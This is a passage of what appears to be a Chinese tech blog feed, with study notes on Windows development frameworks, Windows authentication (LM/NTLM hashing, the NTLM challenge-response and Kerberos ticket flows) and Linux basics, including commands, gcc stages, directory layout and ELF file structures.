Kit即软件开发工具包，顾名思义里面包含了开发所需要用到的一系列的库和工具（比如编写C语言时的头文件与相关库等）</p><p>COM：是一种规范/标准，由于C++的二进制层面标准问题，微软自己规定的该标准，用于方便在windows上实现软件组件之间的相互操作。</p><p>ATL：Active Template Library则是微软提供的一个<strong>模板库</strong>，用于简化上述COM组件的开发。（这里单独拿出来，但实际上是作为MFC的补充库）</p><p>MFC：Microsoft Foundation Class是一个<strong>类库</strong>，一般用于开发具有图形界面的应用程序。如果是Win32API写的话需要大量的过程，而MFC则以类的形式封装。</p><p>WinRT&amp;UWP：即Windows Runtime，是一种标准，建立在之前的COM上。相比与早期的Win下用MFC和ATL进行开发，该标准以C++17的特性等为基础，最大的特点是使用该标准（一堆API函数）实现的应用，也就是UWP（Universal Windows Platform）windows通用平台应用，可以在不同版本的Win版本中运行。</p><blockquote><p>微软商店中下载到的都属于UWP应用，在WinPhone/Win10/11中下载到的东西都是一样的。UI与功能都算是实现了一次开发，多处运行。</p></blockquote><p>.NET：这是一个比较大的话题了，是微软用来与Java体系竞争的，这么理解会容易点。Java、Kotlin=C#、F#、VB；JVM=CLR（Common Language Runtime）公共语言运行时。这里主要还是C#占大头<a href="https://www.bilibili.com/video/BV1fv411h73J">.net Framework、Standard、Core都是些什么东西_哔哩哔哩_bilibili</a></p><ul><li><p><code>.NET FramWork</code>是一种框架（旧版本），当时只能在Win中运行。</p></li><li><p><code>.NET Core</code>是上面框架<code>FramWork</code>的提升，可以跨平台，也是一堆API</p></li><li><code>.NET</code>上面FrameWork和Core的统一，从5.0开始，后面都是开源的</li><li><code>.NET Standard</code>规范，说通俗点就是统一后的API</li><li><code>ASP</code>是在<code>.NET</code>上实现的用于Web的框架/库，类比于JavaWeb等。</li><li><code>ADO</code>用于在该平台上访问和操作数据的，类比于JDBC</li><li><code>WPF</code>、<code>WinForm</code>也是框架，用于Windows图形桌面应用的开发。<code>UWP</code>也可以用C#等语言开发</li><li><code>mono</code>早些FrameWork仅提供于win下，社区就自己开发了这个跨平台，目前已整合到.NET中</li></ul><h3 id="Windows认证"><a href="#Windows认证" class="headerlink" title="Windows认证"></a>Windows认证</h3><p>本机用户密码的hash存放在<code>/Windows/System32/config/SAM</code>中，该文件在OS启动之后被锁定/占用，用户无法打开。对于Kerberos域环境下的域控则是在<code>NTDS.DIT</code>文件中</p><blockquote><p><a href="https://xz.aliyun.com/t/2445?time__1311=n4%2BxnieDqQqWqBIKGNcmYxgDjxYT92rETWD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-13">LM-Hash &amp;&amp; NTLM-Hash - 先知社区 (aliyun.com)</a></p><p><a href="https://www.freebuf.com/articles/web/336237.html">内网攻防：LM 与 NTLM认证以及NTLM中继攻击与反射 - FreeBuf网络安全行业门户</a></p></blockquote><h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>本地认证流程：</p><ol><li>开机，winlogon.exe进程显示登陆界面要求输入用户名和密码</li><li>用户输入后由winlogon.exe发送给lsass.exe进程</li><li>lsass.exe计算明文密码相应的hash</li><li>之后与SAM数据库中的对比，正确就返回User SID和组发给winlogon.exe</li></ol><p>LM Hash：xp及server 03之前，基于DES算法。</p><ol><li>密码——》大写——》16进制字符串，不足14字节的话后面补0</li><li>14字节对半分——》拆开后转为比特流，不足56bit的在左边+0</li><li>将56bit再分为7bit一组，每组末尾+0</li><li>将两个变换后的64bit——》16进制——》分别作为DES密钥，对明文<code>KGS!@#$%</code>进行加密</li><li>两串密文拼接</li></ol><p>NTLM hash：密码字符串——》ASCII字符串——》Hex进制字符串——》Unicode字符串——》MD4消息摘要算法</p><h4 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h4><p>上面说的都是本地登录，在网络环境下，windows也有相应机制。早期的基于LM hash的LM机制，以及目前的NTLM协议与Kerberos协议。</p><blockquote><p>NTLM协议包括v1、v2、session v2三个版本，我们这里仅说明最简单的v1版本。</p><p>具体实现：<a href="https://xz.aliyun.com/t/13101?time__1311=mqmxnDBDcD0A3x05d4%2BxCqkDj2QiDuQD80YD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">NTLM认证详解 - 先知社区 (aliyun.com)</a></p></blockquote><p>NTLM认证协议，基于Challenge/Response挑战响应验证机制，用于对域上主机进行身份验证。</p><p>NTLM v1：</p><ol><li>用户登陆客户端之后，客户端对密码hash处理后缓存，并将用户名发送给服务端，发起认证请求</li><li>服务器生成8B的随机数（质询Challenge），并返回客户端（v2中是16B）</li><li>客户端使用缓存的hash对此随机数进行DES加密，得到Response并发送给服务器（v2中是HMAC-MD5加密）</li><li>服务器发送“用户名”、“Challenge”、“Response”给域控制器</li><li>域控根据“用户名”在其数据库中检索对应的NTLM Hash密码，并用此来加密“Challenge”，之后与“Response”比较，相同则验证成功</li></ol><h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><p>又名三头犬协议，基于票据Ticket，经常使用于域环境中。什么是域环境，可以理解为一个公司的内部网络，该协议用于在内部网络下进行身份检验等，目前的windows server中默认使用该协议。</p><p>三头犬，指的三个基本概念：KDC密钥分发中心（和WinDefender一样占一个用户）、Client客户端、Server服务端。</p><p>当一个新的员工来到公司，访问自家服务器大致需要经过如下步骤：</p><ol><li>C首先向KDC服务器获取TGT（票据授权票据），该票据有一定的时间限制</li><li>之后C再次向KDC访问，需要访问什么服务器，就获取对应的Server Ticket（也可以叫TGS Ticket）</li><li>C来到想要访问服务器前，提交自己的信息和上面的Server Ticket，服务端验证通过后可以向C提供服务</li></ol><p>综上，大致就是先验证身份=正式加入公司了，之后获取访问服务器的权限。接下来我们再向下进一步</p><p>KDC包括以下三个部分：</p><ul><li>一个DB：包含一个域内所有的用户名、密码等信息</li><li>AS-授权服务中心：对用户的身份进行验证，之后颁发TGT（第一次访问对象）</li><li>TGS-票据授予服务：验证TGT与C的权限，验证可以之后颁发对应的Server Ticket（第二次访问对象）</li></ul><p>Client向KDC获取TGT：</p><ol><li><p>Client通过命令行工具<code>kinit</code>将自己的用户名、加密类型、时间戳、要访问的服务器名等信息根据密码加密之后发给AS，方便起见就叫信息包A。注意KDC中必定也有密码，就形成了对称加密，当然密码一般都经过加盐哈希处理</p></li><li><p>AS收到请求后根据DB中存储的密码来进行验证，成功之后AS先随机生成一个TGS session key，之后发送两个东西：由TGS密码加密生成TGT（包括Client的ID、TGS session key等）、由Client密码加密的信息包B（包括要访问的服务器ID、TGS session key等）</p></li><li><p>Client对信息包B按照自己的密码解密，如果错误则本地验证失败。</p><blockquote><p>此时的Client多了一个TGS session key和TGT</p></blockquote></li></ol><p>Client向KDC获取ST：</p><ol><li><p>Client首先利用TGS session key对自身ID等信息加密后得到信息包C，带着TGT一起发送给TGS</p></li><li><p>TGS首先利用密码解密TGT得到TGS session key，之后再对信息包C解密，获得Client信息</p></li><li><p>TGS将信息包C中的信息和解密后的TGT进行对比验证，并检查TGT是否过期</p></li><li><p>验证成功后TGS随机生成Server session key，并发送两个东西给Client：由Server密码加密的ST（包括Server session key、Client的ID等）、由TGS session key加密的信息包D（包括客户端信息与时间戳、Server session key）</p></li><li><p>Client利用TGS session key对信息包D解密验证</p><blockquote><p>此时Client又多了一个ST和Server session key</p></blockquote></li></ol><p>Client访问Server：</p><ol><li>Client将ST和Server session key加密过的自身信息，这里就叫做信息包E，一起发送给Server</li><li>Server首先利用自己的密码对ST进行解密，得到Server session key，并用这个东西对信息包E进行解密来获取Client信息</li><li>之后服务端对Client信息进行检查，包括是否过期、客户端ID、时间戳等</li><li>一切验证无误之后正常交流</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux不完全说明</title>
      <link href="/2023/09/07/Linux%E4%B8%8D%E5%AE%8C%E5%85%A8%E8%AF%B4%E6%98%8E/"/>
      <url>/2023/09/07/Linux%E4%B8%8D%E5%AE%8C%E5%85%A8%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>linux广义上代指一类操作系统，狭义上指内核，下面是一些常见的发行版（=打包(内核+软件)）</p><div class="table-container"><table><thead><tr><th>系</th><th>OS</th><th>说明</th></tr></thead><tbody><tr><td>Arch</td><td><a href="https://archlinux.org">Arch</a>、manjaro</td><td>定制化高，适合折腾</td></tr><tr><td>RedHat</td><td>RHEL、<a href="https://www.centos.org">CentOS</a>、<a href="https://www.fedoraproject.org/zh-Hans/">Fedora</a></td><td>好用，但有些收费</td></tr><tr><td>Debian</td><td><a href="https://bits.debian.org">debian</a>、<a href="https://cn.ubuntu.com/about">ubuntu</a>、<a href="https://linuxmint.com">Mint</a>、<a href="https://www.deepin.org/index/zh">deepin</a>、<a href="https://www.kali.org/features/">Kali</a></td><td>大众化，免费</td></tr><tr><td>SUSE</td><td><a href="https://www.opensuse.org">openSUSE</a></td><td>针对企业，配置稍复杂，国内少</td></tr></tbody></table></div><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>ctrl+alt+t(快速打开终端)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apt list(列举)</span><br><span class="line">upgrade  包名(升级)</span><br><span class="line">autoremove 包名(移除但不包括相关配置)</span><br><span class="line">--purge remove  包名(包括相关配置)</span><br><span class="line"><span class="built_in">exit</span>(退出)</span><br><span class="line"><span class="built_in">sudo</span>(管理员)</span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;要显示的内容&quot;</span></span><br><span class="line"><span class="built_in">kill</span> PID/进程名</span><br><span class="line">ping</span><br><span class="line"><span class="built_in">history</span>(使用过的命令)</span><br></pre></td></tr></table></figure><ul><li><p>日常没什么用？：<code>date</code>显示日期、<code>cal</code>显示日历、<code>bc</code>简单计算器-交互式、<code>uname</code>-查看本机信息、<code>pwd</code>-当前绝对路径</p></li><li><p>文件<strong>权限属性</strong>配置：<code>chgrp</code>-改属组、<code>chown</code>-改属主、<code>chmod</code>-变权限、<code>umask</code>-设置默认权限、<code>chattr</code>-设置隐藏属性、<code>lsattr</code>-查看隐藏属性</p><blockquote><p>文件创建默认666，目录默认777。<code>umask</code>指令后跟要减掉的权限</p></blockquote></li><li><p><strong>文件目录操作</strong>：<code>cd</code>-换目录、<code>ls</code>-检视、<code>cp</code>-复制、<code>rm</code>-删除、<code>mv</code>-移动或改名、<code>mkdir</code>-创建目录、<code>rmdir</code>-删除空目录、<code>touch</code>-修改创建文件</p></li><li><p>文件内容查阅：<code>cat</code>-第一行开始全部显示、<code>tac</code>-最后一行开始、<code>more/less</code>-页单位显示、<code>head/tail</code>-只看头或尾、<code>od</code>-二进制查看、<code>nl</code>-带行号显示、<code>file</code>-观察文件类型</p></li><li><p>关机有关指令：<code>shutdown</code>=<code>systemctl</code>+<code>reboot</code>,<code>halt</code>,<code>poweroff</code>；数据同步写入盘中<code>sync</code></p></li><li><p>文本编辑器：<code>nano</code>、<code>vi</code>、<code>vim</code></p><blockquote><p>vim：i(进入编辑模式),ESC(退出编辑模式),:(开启命令模式)<br>:q(离开，并不保存) :q!(强制离开不储存) :w(写入) :w!(强制写入，但与权限有关)可配合使用</p></blockquote></li><li><p>求助工具：<code>man</code>一次全显示，<code>info</code>页显示；<code>/usr/share/doc/</code>存放软件信息；<code>xx -h</code></p><blockquote><p>man中表格第一行，数字-意义：1-可执行文件；3-大多为C函数库；4-设备文件或文件格式；5-配置文件；8-root可用命令；9-与内核相关</p></blockquote></li><li><p>搜索指令：<code>which</code> 寻找可执行文件、<code>whereis</code>、<code>locate</code>、 <code>find</code>根据文件名寻找</p><blockquote><p>locate使用本地数据库查找/var/lib/mlocate，updatedb指令会读取/etc/updatedb.conf来更新该数据库。whereis仅在指定目录下查找内容，-l列出查找列表。find全盘寻找</p></blockquote></li><li><p><strong>GCC</strong>工具链 = gcc(编译) + cpp(预处理) + as(处理汇编) + ld(链接)+make(构建)</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcc [参数] [相关文件名称，可多个] -o [生成文件名称]</span><br><span class="line">gcc hello.c -o hello或hello.out---------------------(一步到位)</span><br><span class="line">1.预处理：gcc -E hello.c -o test.i---------------------(加入头文件)</span><br><span class="line">2.编译：gcc -S test.i -o test1.s-----------------------(生成汇编文件)</span><br><span class="line">3.汇编：gcc -c test1.s -o hello.o----------------------(生成目标文件)</span><br><span class="line"><span class="comment">#ps：在此.o或.obj文件中存放着ELF格式的代码，最接近机器语言</span></span><br><span class="line">4.链接器ld链接生成可执行程序：gcc hello.o -o hello-----------(与其他文件链接)</span><br><span class="line">5.运行：在目标执行文件目录下./hello或hello.out</span><br><span class="line"><span class="comment">#ps：不写生成文件名就会默认a.out；在win平台下中间相同，但生成.exe</span></span><br></pre></td></tr></table></figure><ul><li>正则表达式（方便bash下使用）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">^[a-z0-9] + abc$ //以a-z或0-9开头，以abc结尾的字符串</span><br><span class="line">[^abc]//匹配字符串中所有的除abc外的东西，包括空格</span><br><span class="line">.//匹配除换行符外的任何</span><br><span class="line">\w数字，字母下划线、\f换页、\n换行、\r回车、\s匹配所有空白包括换行、\S匹配非空白、\t制表符、\v垂直制表符</span><br><span class="line">*零次或多次、+一次或多次、|表示或、？零次或一次、\转义字符，后跟大小中括号</span><br><span class="line">修饰符</span><br><span class="line">/xxx/i//不区分大小写</span><br><span class="line">~~~/g//所有匹配的</span><br><span class="line">~~~/m//搭配边界字符^与$配合所有行</span><br><span class="line">~~~./s//在原基础上还需匹配换行符</span><br></pre></td></tr></table></figure><h3 id="文件-amp-目录-amp-群组"><a href="#文件-amp-目录-amp-群组" class="headerlink" title="文件&amp;目录&amp;群组"></a>文件&amp;目录&amp;群组</h3><p>一切皆文件：在Linux下文件的识别执行仅与[-rwxrwxrwx]有关，后缀无关</p><ul><li>正规文件：纯文本文件ASCII（给人读的）、二进制文档（执行的）、数据格式文件（软件用的）</li><li>目录-d、链接文件-l（硬链接与软链接）</li><li>设备与设备文件：区块设备文件-b（内存硬盘等）、字符设备文件-c（鼠标键盘等）</li><li>数据接口文件-s：用于网络上的数据承接（常出现于/run或/tmp下）</li></ul><p><img src="https://s2.loli.net/2024/08/08/QJ41jHhu5cL3pGY.jpg" alt="Linux.jpg"></p><ul><li>/sbin、/usr/sbin、/usr/local/sbin（指令）：管理员可以使用的可执行命令；</li><li>/bin——————（指令）：存放shell解释器，给普通用户使用的命令；</li><li>/root—-（账户/指令）：系统管理员的目录；</li><li>/home-（账户）：用户目录，新增用户时会在此文件下新建；</li><li>/usr——-（账户）：应用程序存放位置<ul><li>/bin：应用程序；</li><li>/share：多用户共享数据；</li><li>/lib：库函数文件；</li><li>/local：软件升级包；</li><li>/src：内核源代码；</li></ul></li><li>/boot——（系统必要）：系统内核and引导装载文件；</li><li>/etc———（系统必要）：存放系统的部分配置文件and子目录列表；</li><li>/sys———（系统必要）：虚拟档案系统，类似/proc；</li><li>/lib、/lib32、64、x32（系统必要）：动态链接资源库；</li><li>/dev———（外部文件）：存放设备文件，即驱动、网卡等；</li><li>/mnt——-（外部文件）：文件系统挂载；</li><li>/media—（外部文件）：其他设备挂载，U盘等；</li><li>/proc——-（运行过程）：该目录中的数据都在内存中，即内存的映射！；</li><li>/var———-（运行过程）：存放系统运行过程中经常变化的文件；</li><li>/lost+found—（临时）：系统非法关机后会有内容，否则为空；</li><li>/run——————-（临时）：系统启动临时文件；</li><li>/tmp——————（临时）：系统运行临时文件；</li><li>/srv（扩展）：服务启动后要访问的数据目录，部署服务器后有内容；</li><li>/opt（扩展）：额外安装的软件；</li></ul><h3 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h3><p>Linux下的可执行文件，全称<strong>Executable and Linking Format</strong>，elf文件相关定义在<code>/usr/include/elf.h</code>中，有32位和64位版本，区别仅在于部分成员大小不一样，内容如下：</p><ul><li>包括.out &amp; .o &amp; .so &amp; .elf &amp; .prx文件；readelf，启动！！！</li><li>.out/可执行文件：包含代码和数据（有相对固定地址），可直接运行，系统根据地址加载到内存执行</li><li>.o/可重定位文件：包含基础代码和数据，而且都没有指定地址，需要与其他文件配合使用</li><li>.so/共享目标文件：也叫动态库文件，包含代码与数据，是在原程序运行时动态链接的</li><li>详见！！！<a href="https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf">Understanding_ELF.pdf (seebug.org)</a></li></ul><p>相关概念如下：</p><ul><li>目标文件：可重定位目标文件（汇编器生成的）、可执行目标文件、共享目标文件（链接器+加载器都用，同时具有ScHead和ProHead）；</li><li><p>动态链接：是解析符号引用的过程，在进程初始化和运行期间都可能发生</p></li><li><p>链接器：以目标文件为输入，经过符号解析（目标文件中的符号和其定义进行关联）与重定位（将符号的定义与在内存中的位置关联），输出可加载和运行的可执行目标文件。不看程序头表</p></li><li>加载器：用于加载可执行文件到内存，看不见节头表，将节换为段</li><li>程序解析器：系统执行程序时，系统函数 exec(BA_OS)会被调用，内核会去读取该程序的某一节，解析出其包含的ELF 程序解析器的路径字符串。有的话，解析器程序将从系统手中接过控制权继续执行，读取并映射可执行程序的段到内存中，有些则直接将文件内容载入内存</li></ul><p>根据链接和运行时的角度，其文件格式稍有不同（实际上除了ELF文件头外，位置都不固定）：</p><p><img src="https://s2.loli.net/2024/08/08/TvNhMSLPYWJFG6g.png" alt="elf.png"></p><p>大致包括四部分：ELF头（ELF header)、程序头表（Program header table)、节（Section)OR段（Segment）、节头表（Section header table)OR段头表</p><p><strong>ELF文件头</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> e_ident[EI_NIDENT];<span class="comment">//魔数,16Byte,见下表</span></span><br><span class="line">    Elf32_Half    e_type;         <span class="comment">//文件类型</span></span><br><span class="line">  Elf32_Half    e_machine;      <span class="comment">//架构</span></span><br><span class="line">  Elf32_Word    e_version;      <span class="comment">//目标文件版本</span></span><br><span class="line">  Elf32_Addr    e_entry;        <span class="comment">//程序的入口虚拟地址</span></span><br><span class="line">  Elf32_Off  e_phoff;        <span class="comment">//程序头表的偏移量，木有则为0</span></span><br><span class="line">  Elf32_Off   e_shoff;        <span class="comment">//节头表开始在文件中的偏移量，同上</span></span><br><span class="line">  Elf32_Word    e_flags;        <span class="comment">//处理器特定标志位</span></span><br><span class="line">  Elf32_Half    e_ehsize;       <span class="comment">//ELF头字节大小</span></span><br><span class="line">  Elf32_Half    e_phentsize;    <span class="comment">//程序头表中每一个表项的字节大小</span></span><br><span class="line"> Elf32_Half    e_phnum;        <span class="comment">//程序头表中共有多少个表项</span></span><br><span class="line"> Elf32_Half    e_shentsize;    <span class="comment">//节头表字节大小</span></span><br><span class="line">  Elf32_Half    e_shnum;        <span class="comment">//节头表表项数目</span></span><br><span class="line">  Elf32_Half    e_shstrndx;     <span class="comment">//一个节头表项的索引,该项指向存储&quot;节名字表&quot;,没有就设为&quot;SHN_UNDEF&quot;</span></span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>偏移</th><th>内容</th><th>偏移</th><th>内容</th></tr></thead><tbody><tr><td>0-3</td><td>0x7f+”ELF“</td><td>4</td><td>0非法文件,1代表32位,2代表64位</td></tr><tr><td>5</td><td>0非法编码,1小端,2大端</td><td>6</td><td>ELF文件头版本,通常为1</td></tr><tr><td>7-15</td><td>暂未使用</td><td>16</td><td>本数组大小</td></tr></tbody></table></div><p><strong>程序头表</strong>：提供程序加载到内存中的段信息，为数组结构，每一项结构如下（一个段包含1个或多个节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Elf32_Word    p_type;         <span class="comment">//本段的类型</span></span><br><span class="line">  Elf32_Off p_offset;       <span class="comment">//偏移位置</span></span><br><span class="line">  Elf32_Addr    p_vaddr;        <span class="comment">//本段应加载的虚拟地址</span></span><br><span class="line">  Elf32_Addr    p_paddr;        <span class="comment">//加载物理地址,根据系统选择</span></span><br><span class="line">  Elf32_Word    p_filesz;       <span class="comment">//本段在文件中大小</span></span><br><span class="line">  Elf32_Word    p_memsz;        <span class="comment">//本段在内存中的大小</span></span><br><span class="line">  Elf32_Word    p_flags;        <span class="comment">//本段内容属性,系统会根据此段赋予一定权限</span></span><br><span class="line">  Elf32_Word    p_align;        <span class="comment">//为0/1时则虚拟地址和偏移没有对齐要求,否则表示对其要求2的次方</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p><strong>节头表</strong>：同上，也是数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Elf32_Word    sh_name;        <span class="comment">//节的名称,其值为&quot;节名字表&quot;中的偏移</span></span><br><span class="line">  Elf32_Word    sh_type;        <span class="comment">//节的类型</span></span><br><span class="line">  Elf32_Word    sh_flags;       <span class="comment">//本节的属性,1运行时可写,2运行时占用内存单元,4指令</span></span><br><span class="line">  Elf32_Addr    sh_addr;        <span class="comment">//本节内容需要映射的起始地址</span></span><br><span class="line">  Elf32_Off sh_offset;      <span class="comment">//本节相对于文件开头的偏移量</span></span><br><span class="line">  Elf32_Word    sh_size;        <span class="comment">//本节大小,字节</span></span><br><span class="line">  Elf32_Word    sh_link;        <span class="comment">//指向节头表中本节的位置</span></span><br><span class="line">  Elf32_Word    sh_info;        <span class="comment">//附加信息</span></span><br><span class="line">  Elf32_Word    sh_addralign;   <span class="comment">//对齐方式,同上</span></span><br><span class="line">  Elf32_Word    sh_entsize;     <span class="comment">//有些节内容为一张表,该项指定节中每一表项的大小,为0代表不是表格</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>节</strong>：专用于链接过程（也就是没有执行时）。.开头的都是系统保留的，当然也可以自己插入自定义的段<code>objcopy</code>工具可以将图片、音乐之类的作为段插入到目标文件中。此外gcc提供了一个扩展机制，使得程序员可以指定变量所处的段<code>__attribute__((section(&quot;hah&quot;)))</code>，变量前加上此扩展可以把对应的变量放到对应的段，下面是一些常见的段：</p><ul><li>.data段保存已初始化的全局静态变量和局部静态变量</li><li>.rodata存放只读数据，包括但不限于格式化字符串，const关键字修饰的变量</li><li>.bss存放未初始化的全局变量和局部静态变量（仅在装载时占用空间）</li><li>.plt和.got动态链接的跳转表和全局入口表</li><li>.init和.fini程序的初始化与终结代码段</li><li>.debug调试信息。gcc的-g参数用于加上调试信息，会最终多出来一个debug段，<code>strip</code>可以去除ELF文件中的调试信息。ELF采用DWARF标准的调试信息格式，微软采用CodeView标准。</li><li><p>.line包含调试符号的行号，即源代码行号编译后指令的对应表</p></li><li><p>.text程序指令代码；.rel.text代码段的重定位表</p></li><li><p>其他链接相关：.dynamic动态链接信息；.dynstr动态链接的字符串；.dynsym动态链接符号表；.relname重定位信息；</p></li><li><p>其他：.comment存放编译器版本控制信息；.note注释节；</p></li><li><p>字符串相关：.hash符号哈希表，帮助查找符号；.interp包含ELF程序解析器的路径名；.shstrtab节名字表；.symtab符号表；.strtab字符串表，存储ELF文件中用到的各种字符串；</p><blockquote><p><code>nm</code>、<code>objdump</code>、<code>readelf</code>查看符号表。<code>ldd xx</code>可以查看目标依赖于哪些共享库</p></blockquote></li></ul><p><strong>字符串表</strong>：包含若干以”null”结尾的字符串，第一个字符串为空串，用于表示”NULL”，该表不一定只有一个，节名字表也类似结构（索引指向开头，直到’\0’出现）。</p><p>以上面这个25字节的表为例子：包含0-null、1-name.、7-Variable、11-able、16-able、24-null</p><p><strong>符号表</strong>：用于定位和重定位程序中的符号定义和引用，下面是一项的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">Elf32_Word st_name;<span class="comment">//符号名字,是一个指向字符串表的索引值,0代表没名字</span></span><br><span class="line">Elf32_Addr st_value; <span class="comment">//符号的值,没有固定类型</span></span><br><span class="line">Elf32_Word st_size; <span class="comment">//符号大小,即字节数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//符号类型属性</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">//暂未使用,0</span></span><br><span class="line">Elf32_Half st_shndx; <span class="comment">//索引值,指向相关联的节在节头表中的位置</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><strong>重定位信息</strong>：比如函数名，就代表跳转到该段程序入口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">Elf32_Addr r_offset;<span class="comment">//对重定位文件来说是节中的字节偏移量,对.out和.so来说是虚拟地址</span></span><br><span class="line">Elf32_Word r_info; <span class="comment">//重定位作用的符号表索引</span></span><br><span class="line">Elf32_Sword r_addend;<span class="comment">//在Elf32_Rela中有,用于计算需要重定位的域值</span></span><br><span class="line">&#125; Elf32_Rel(a);</span><br></pre></td></tr></table></figure><p><strong>段</strong>：有若干节构成，存在于装载（目标文件载入内存）和动态连接（解析目标文件中的符号引用）过程中</p><p>代码段/文本段：.text、.rodata、.hash、.dynsym、.dynstr、.plt、.rel.got</p><p>数据段：.data、.dynamic、.got、.bss</p><p>注释段/注释节：用于给其他程序检查目标文件的一致性和兼容性</p><p>动态段：提供给动态链接器所需要的信息</p><h3 id="内核介绍"><a href="#内核介绍" class="headerlink" title="内核介绍"></a>内核介绍</h3><p>宏/单内核特点（Linux）：</p><ul><li>内部分多个模块，但运行时是个单独的二进制大映像</li><li>内核程序以内核空间的身份运行</li><li>模块间通讯直接调用其他模块中的函数</li><li>安全性差、占用资源多</li></ul><p>微内核（minix、鸿蒙、L4）：</p><ul><li>大部分内核都作为单独的进程在特权状态下运行，消息传递进行通讯</li><li>微内核部分=消息转发站；</li><li>通讯开销大、硬件访问慢-驱动用户态下运行</li></ul><p>混合内核（Mac、Win）：</p><ul><li>让微内核结构中的一些运行在用户空间的代码跑在内核空间</li></ul><p>Linux6.5：RISC-V 64、Rust、WiFi-7、USB4.2、CPU并行启动</p><div class="table-container"><table><thead><tr><th>内核文件</th><th>说明</th></tr></thead><tbody><tr><td>/arch</td><td>支持的体系结构</td></tr><tr><td>/document</td><td>说明文档</td></tr><tr><td>/drivers</td><td>系统中的主要驱动设备</td></tr><tr><td>/fs</td><td>支持的文件系统和文件操作</td></tr><tr><td>/include</td><td>其下/linux包含一些关键数据结构</td></tr><tr><td>/init</td><td>内核初始化代码</td></tr><tr><td>/ipc</td><td>进程间通信代码</td></tr><tr><td>/Kernel</td><td>内核管理核心代码</td></tr><tr><td>/lib</td><td>核心库代码</td></tr><tr><td>/mm</td><td>内存管理代码</td></tr><tr><td>/net</td><td>网络功能，实现常见的网络协议</td></tr><tr><td>/scripts</td><td>配置内核的脚本</td></tr><tr><td>/block</td><td>块设备驱动I/O调度的代码</td></tr><tr><td>/crypto</td><td>常见加密、压缩、校验算法</td></tr><tr><td>/security</td><td>SELinux模块代码</td></tr><tr><td>/sound</td><td>音频设备驱动</td></tr></tbody></table></div><ul><li><p>内存管理：/mm<br>4KB的内存页，并采用页缓存技术（基数树管理页缓存中包含的页）；<br>三级页表=偏移1、2、3+页内偏移（页目录、中间页目录、页表、物理页帧）</p></li><li><p>